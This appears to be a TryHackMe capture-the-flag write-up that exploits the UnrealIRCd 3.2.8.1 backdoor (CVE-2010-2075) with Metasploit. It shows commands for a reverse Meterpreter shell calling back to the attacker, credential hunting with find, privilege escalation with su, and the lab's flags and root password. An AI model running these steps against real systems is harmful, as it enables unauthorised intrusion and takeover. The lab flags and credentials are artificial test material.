# THM — UnrealIRCd 3.2.8.1 Backdoor

**Platform:** TryHackMe | **Difficulty:** Easy | **OS:** Linux | **IP:** 10.112.169.142  
**Date:** 2026-06-27 | **Status:** ✅ Pwned | **Root:** ✅

---

## Attack Chain

```
Recon (nmap) → IRC Version Detection (UnrealIRCd 3.2.8.1)
  ↓ CVE-2010-2075 Backdoor identified via searchsploit
Metasploit exploit/unix/irc/unreal_ircd_3281_backdoor
  ↓ Meterpreter session → webmaster shell
cat /home/webmaster/flag.txt → USER FLAG ✅
  ↓ find / -name password* → /etc/password.txt (Plaintext root creds)
su root → uid=0(root) → ROOT FLAG ✅
```

---

## Methodology

1. **Connectivity Check** — ping to confirm target is up (TTL=62 → Linux)
2. **Recon** — `nmap -sCV -A` reveals 2 open ports: SSH (22) and IRC (6667)
3. **Vulnerability Research** — `searchsploit UnrealIRCd` + Metasploit confirm CVE-2010-2075 (Backdoor Command Execution, rank: excellent)
4. **Exploitation** — Metasploit module with `LHOST=tun0`, staged Meterpreter payload via HTTP
5. **Post-Exploitation** — `getuid` confirms `webmaster`, grab user flag, stabilize shell via `python3 pty.spawn`
6. **PrivEsc** — `find / -name password*` reveals `/etc/password.txt` with plaintext root password
7. **Root** — `su root` with discovered credentials

---

## Recon

```bash
nmap -sCV -A 10.112.169.142 -oN nmap-scan.md
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 6667/tcp | IRC | **UnrealIRCd 3.2.8.1** |

NSE `irc-info` script confirmed hostname `irc.pentest-target.thm` and version `Unreal3.2.8.1` in the welcome banner — the exploitation entry point.

---

## Vulnerability Research

```bash
searchsploit UnrealIRCd
# UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) | linux/remote/16922.rb
```

```bash
msfconsole -q
search UnrealIRCd
# exploit/unix/irc/unreal_ircd_3281_backdoor   Rank: excellent   Check: Yes
```

**CVE-2010-2075** — A backdoor was planted inside the official UnrealIRCd source distribution. It allows arbitrary OS command execution via a specially crafted IRC message, with no authentication required.

---

## Exploitation

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set LHOST tun0   # tun0 = TryHackMe VPN interface (192.168.147.12)
set RHOSTS 10.112.169.142
run
```

**What happened:**
1. Metasploit connected to port 6667 and registered a temporary IRC user to complete the handshake
2. Target confirmed vulnerable (`The target appears to be vulnerable`)
3. Backdoor command executed via IRC protocol
4. Staged Meterpreter payload (1062760 bytes) downloaded and executed via HTTP
5. Reverse TCP session opened

```
[+] 10.112.169.142:6667 - The target appears to be vulnerable.
[*] Meterpreter session 1 opened (192.168.147.12:4444 -> 10.112.169.142:37488)
```

> **Note:** Always identify the correct LHOST interface first (`ifconfig`). Using the wrong IP means no reverse shell callback — no error message, just silence.

---

## Post-Exploitation

```bash
meterpreter > getuid
# Server username: webmaster

meterpreter > cat /home/webmaster/flag.txt
# THM{Pwned-Y0ur-First-Machine}
```

🚩 **User Flag:** `THM{Pwned-Y0ur-First-Machine}`

### Shell Stabilization

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

```bash
find / -name password* 2>/dev/null
# /etc/password.txt

cat /etc/password.txt
# root:PDLrCVl1pLD91U0JMmCz
```

`/etc/password.txt` is non-standard — not part of any system package. Storing root credentials in plaintext under `/etc/` with world-readable permissions is a **Critical misconfiguration**: any low-privilege user on the system can read it.

```bash
su root
# Password: PDLrCVl1pLD91U0JMmCz

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
# THM{Escalat1on-D0ne}
```

🚩 **Root Flag:** `THM{Escalat1on-D0ne}`

---

## Vulnerability Summary

| # | Vulnerability | Severity | Location |
|---|--------------|----------|----------|
| 1 | UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075) | Critical | Port 6667 |
| 2 | Plaintext Root Credentials in World-Readable File | Critical | /etc/password.txt |

---

## Key Takeaways

- Old IRC/FTP/SMB versions → check for historical CVEs and backdoors before any manual exploitation attempt
- Always confirm the correct VPN interface (`tun0`) before setting `LHOST` — wrong IP = silent failure
- Metasploit modules rated `excellent` with `Check: Yes` are worth prioritizing — they confirm vulnerability before execution
- Meterpreter ≠ full TTY. Transition to `pty.spawn` before any interactive PrivEsc steps (e.g., `su`)
- `find / -name password* 2>/dev/null` is one of the fastest Local PrivEsc enumeration moves — never skip it
- Plaintext credentials in `/etc/` = Critical finding in any real engagement. Immediate remediation: encrypt or use a secrets manager

---

*Writeup by Z3R0 — TryHackMe | June 2026*
